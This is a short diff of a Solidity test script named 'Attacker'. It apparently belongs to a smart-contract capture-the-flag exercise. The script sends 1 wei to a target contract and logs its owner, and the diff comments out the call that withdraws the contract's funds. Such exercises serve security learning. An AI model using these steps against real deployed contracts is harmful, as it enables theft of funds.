@@ -16,7 +16,7 @@ contract Attacker is Test {
         payable(fb).transfer(1 wei);
         address owner = fb.owner();
         console.log("owner: ", owner);
-        fb.withdraw();
+        // fb.withdraw();
         vm.stopBroadcast();
     }
 }
